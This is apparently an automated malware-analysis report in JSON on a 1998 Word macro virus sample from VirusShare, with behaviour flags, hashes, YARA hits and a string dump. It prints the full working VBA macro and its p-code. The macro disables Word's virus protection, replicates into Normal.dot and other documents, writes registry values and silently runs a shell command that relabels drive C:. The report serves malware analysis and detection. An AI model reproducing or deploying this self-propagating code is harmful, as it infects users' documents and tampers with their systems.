{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AddFromString": "May attempt to modify the VBA code",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Close": "Runs when the Word document is closed",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Shell": "May run an executable file or a system command",
            "System": "May run an executable file or a system command on a Mac",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "WINDOWS": "May enumerate application windows",
            "shell32": "May run an executable file or a system command",
            "vbHide": "May run an executable file or a system command"
        },
        "macro": "Private Sub Document_Open()\nOn Error Resume Next\n\nbSavedState = ActiveDocument.Saved\n\nApplication.EnableCancelKey = Not True\nOptions.VirusProtection = Not True\nOptions.SaveNormalPrompt = Not True\nOptions.ConfirmConversions = Not True\n\nsLines = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)\n\nIf NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> \"Private Sub Document_Close()\" Then\nNormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString sLines\nNormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, \"Private Sub Document_Close()\"\n\nSystem.PrivateProfileString(\"\", \"HKEY_CLASSES_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\", \"\") = \"Little Miss Nick\"\nSystem.PrivateProfileString(\"\", \"HKEY_CLASSES_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon\", \"\") = \"C:\\\\WINDOWS\\\\SYSTEM\\\\shell32.dll,10\"\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Account Manager\\Accounts\\00000008\", \"SMTP Display Name\") = \"Asexual\"\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Account Manager\\Accounts\\00000008\", \"SMTP Email Address\") = \"nick@virusbtn.com\"\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\WinIni\", \"Name\") = \"Nick FitzGerald the queen\"\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\WinIni\", \"SN\") = \"415F7097\"\nSystem.PrivateProfileString(\"win.ini\", \"WinZip\", \"Name\") = \"Nick FitzGerald the queen\"\nSystem.PrivateProfileString(\"win.ini\", \"WinZip\", \"Name\") = \"415F7097\"\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\Hearts\", \"name\") = \"NicKKK\"\n\nShell \"label c: n0nuts\", vbHide\n\nElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> \"Private Sub Document_Open()\" Then\nActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString sLines\nActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, \"Private Sub Document_Open()\"\nIf Left(ActiveDocument.Name, 8) <> \"Document\" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName\nEnd If\n\nActiveDocument.Saved = bSavedState\n\nEnd Sub\n\n' Processing file: VirusShare_1eb65b15099c7d19eaf7b38507b9acd1\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 4050 bytes\n' Line #0:\n' \tFuncDefn (Private Sub Document_Open())\n' Line #1:\n' \tOnError (Resume Next) \n' Line #2:\n' Line #3:\n' \tLd ActiveDocument \n' \tMemLd Saved \n' \tSt bSavedState \n' Line #4:\n' Line #5:\n' \tLitVarSpecial (True)\n' \tNot \n' \tLd Application \n' \tMemSt EnableCancelKey \n' Line #6:\n' \tLitVarSpecial (True)\n' \tNot \n' \tLd Options \n' \tMemSt VirusProtection \n' Line #7:\n' \tLitVarSpecial (True)\n' \tNot \n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' Line #8:\n' \tLitVarSpecial (True)\n' \tNot \n' \tLd Options \n' \tMemSt ConfirmConversions \n' Line #9:\n' Line #10:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tSt sLines \n' Line #11:\n' Line #12:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x001C \"Private Sub Document_Close()\"\n' \tNe \n' \tIfBlock \n' Line #13:\n' \tLd sLines \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemCall AddFromString 0x0001 \n' Line #14:\n' \tLitDI2 0x0001 \n' \tLitStr 0x001C \"Private Sub Document_Close()\"\n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemCall ReplaceLine 0x0002 \n' Line #15:\n' Line #16:\n' \tLitStr 0x0010 \"Little Miss Nick\"\n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x003E \"HKEY_CLASSES_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\"\n' \tLitStr 0x0000 \"\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' Line #17:\n' \tLitStr 0x0023 \"C:\\\\WINDOWS\\\\SYSTEM\\\\shell32.dll,10\"\n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x004A \"HKEY_CLASSES_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon\"\n' \tLitStr 0x0000 \"\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' Line #18:\n' \tLitStr 0x0007 \"Asexual\"\n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x004F \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Account Manager\\Accounts\\00000008\"\n' \tLitStr 0x0011 \"SMTP Display Name\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' Line #19:\n' \tLitStr 0x0011 \"nick@virusbtn.com\"\n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x004F \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Account Manager\\Accounts\\00000008\"\n' \tLitStr 0x0012 \"SMTP Email Address\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' Line #20:\n' \tLitStr 0x0019 \"Nick FitzGerald the queen\"\n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x003B \"HKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\WinIni\"\n' \tLitStr 0x0004 \"Name\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' Line #21:\n' \tLitStr 0x0008 \"415F7097\"\n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x003B \"HKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\WinIni\"\n' \tLitStr 0x0002 \"SN\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' Line #22:\n' \tLitStr 0x0019 \"Nick FitzGerald the queen\"\n' \tLitStr 0x0007 \"win.ini\"\n' \tLitStr 0x0006 \"WinZip\"\n' \tLitStr 0x0004 \"Name\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' Line #23:\n' \tLitStr 0x0008 \"415F7097\"\n' \tLitStr 0x0007 \"win.ini\"\n' \tLitStr 0x0006 \"WinZip\"\n' \tLitStr 0x0004 \"Name\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' Line #24:\n' \tLitStr 0x0006 \"NicKKK\"\n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x004A \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\Hearts\"\n' \tLitStr 0x0004 \"name\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' Line #25:\n' Line #26:\n' \tLitStr 0x000F \"label c: n0nuts\"\n' \tLd vbHide \n' \tArgsCall Shell 0x0002 \n' Line #27:\n' Line #28:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x001B \"Private Sub Document_Open()\"\n' \tNe \n' \tElseIfBlock \n' Line #29:\n' \tLd sLines \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemCall AddFromString 0x0001 \n' Line #30:\n' \tLitDI2 0x0001 \n' \tLitStr 0x001B \"Private Sub Document_Open()\"\n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemCall ReplaceLine 0x0002 \n' Line #31:\n' \tLd ActiveDocument \n' \tMemLd New \n' \tLitDI2 0x0008 \n' \tArgsLd LBound 0x0002 \n' \tLitStr 0x0008 \"Document\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' \tEndIf \n' Line #32:\n' \tEndIfBlock \n' Line #33:\n' Line #34:\n' \tLd bSavedState \n' \tLd ActiveDocument \n' \tMemSt Saved \n' Line #35:\n' Line #36:\n' \tEndSub \n"
    },
    "filename": "VirusShare_1eb65b15099c7d19eaf7b38507b9acd1",
    "filesize": 29696,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Title:  , Author: Nick FitzGerald, Template: Normal.dot, Last Saved By: Nick FitzGerald, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Sun Nov  1 21:13:00 1998, Last Saved Time/Date: Sun Nov  1 21:13:00 1998, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "1eb65b15099c7d19eaf7b38507b9acd1",
        "sha1": "6d87d263bc27900b48597546429a5494eef37a86",
        "sha256": "dea6bcb1edcd318f73025cbccebd31e4e43f8e5562a34f188a47715e6e19a1c3"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjWW",
            "/ =!",
            "Nick FitzGerald",
            "Normal.dot",
            "Nick FitzGerald",
            "Microsoft Word 8.0",
            "Title",
            "_PID_GUID",
            "Private Sub Document_Close()",
            "Private Sub Document_Close()",
            "Little Miss Nick",
            "HKEY_CLASSES_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}",
            "C:\\\\WINDOWS\\\\SYSTEM\\\\shell32.dll,10",
            "HKEY_CLASSES_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon",
            "Asexual",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Account Manager\\Accounts\\00000008",
            "SMTP Display Name",
            "nick@virusbtn.com",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Account Manager\\Accounts\\00000008",
            "SMTP Email Address ",
            "Nick FitzGerald the queen",
            "HKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\WinIni",
            "Name ",
            "415F7097",
            "HKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\WinIni",
            "Nick FitzGerald the queen",
            "win.ini",
            "WinZip",
            "Name ",
            "415F7097",
            "win.ini",
            "WinZip",
            "Name ",
            "NicKKK",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\Hearts",
            "name ",
            "label c: n0nuts",
            "Private Sub Document_Open()",
            "Private Sub Document_Open()",
            "Document",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "8 Sub ",
            "t_Open()",
            "On Err@or Res ",
            "Next",
            "HbSa2St",
            "= Act",
            "Application.En:",
            "CancelKeBy",
            "qNot ",
            "s.Viru@sProte",
            "Confirm",
            "vers",
            "sLine",
            " Macro",
            "r.VB@",
            "Compon}",
            "s.Item(1",
            ").CodeMo dule.",
            "Count",
            "s#1) <H> \"RuCl",
            ")\" Then",
            "AddFromSng R",
            "Rece",
            "T.Sys",
            "d.8!@lfileC#(\"",
            "\", \"HKEY",
            "_CLASSES",
            "_ROOT\\CL",
            "SID\\{20D",
            "04FE0-3A",
            "EA-1069-",
            "A2D8-080",
            "02B30309$D}!",
            "\") F\"L",
            "itt@vMiss Nick ",
            "\\Defaul tIcon",
            "\\\\WINDOW",
            "S\\\\SYSTE",
            "M\\\\shell",
            "32.dll,1",
            "\"URREN",
            "T_USER\\S",
            "oftw\\Mi",
            "\\Internetzc!T",
            "nager\\AcQ",
            "SMTP Dis 8",
            "'Asexual",
            "@Email @Ur(ess",
            "n@8@v",
            "btn.com",
            "@Bo#k A",
            "uting\\Wi",
            "nZip",
            "H Fitz",
            "Gerald t",
            "he queen",
            "SN# ",
            "415F7097]",
            "win.i",
            ",i|Y",
            "dows\\Curr V",
            "ets\\Heartsa",
            "6 \"label",
            " c: n0nuA",
            "vbHidy",
            "E|p[",
            "pododld",
            "[xe[",
            "ro/k/k2.o[es`vve{",
            "o[iv",
            "Left(",
            "1, 8CkE",
            "!oveAs",
            "4le\tQ",
            "Full",
            "nd If",
            "2363ccef2",
            "DEST",
            "Wordk",
            "Win16~",
            "Win32",
            "1stman",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Documentj",
            "Document_Close7\\",
            "bSavedStates9",
            "ActiveDocument\\",
            "Savedd",
            "Application*",
            "EnableCancelKey",
            "Options",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "ConfirmConversions",
            "sLinesm",
            "MacroContainer>",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "CodeModule",
            "Lines",
            "CountOfLines!\\",
            "NormalTemplateq",
            "AddFromString",
            "ReplaceLine",
            "Systema",
            "PrivateProfileString[",
            "ShellV",
            "vbHideW",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "Document_Open",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "StdOle2.",
            "tlb#OLE ",
            "Automati,on",
            "Forms>",
            "F38D2",
            "4AA1-F00",
            "A-11D1-B",
            "5F9-D0B0p07C1",
            "TWD#Micr@osoft ",
            "` Ob",
            " Library",
            "E7AEA3-6(2E0",
            "44455354",
            "\tPI:\\",
            "P\\VHBE\\&EX&",
            "CvN@SalCvNRav",
            " )\t*",
            "OfficDO@f",
            "G{2D",
            "F8D04C-5",
            "d01B-BHDE5@AA@4",
            "dPROGR",
            "AM FILES",
            "\\MICROSO",
            "FT OFFIC",
            "MSO970.DLLHi# 8",
            "BThi",
            "sDocumenDt",
            "@1TD",
            "h@6s",
            "DIcD",
            "ThisDocument",
            "ID=\"{C752CA86-71A5-11D2-B5FC-444553540000}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"989A0F3513351335133513\"",
            "DPB=\"3032A7C8A8C8A8C8\"",
            "GC=\"C8CA5F606060609F\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWo",
            "rdDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.325906",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
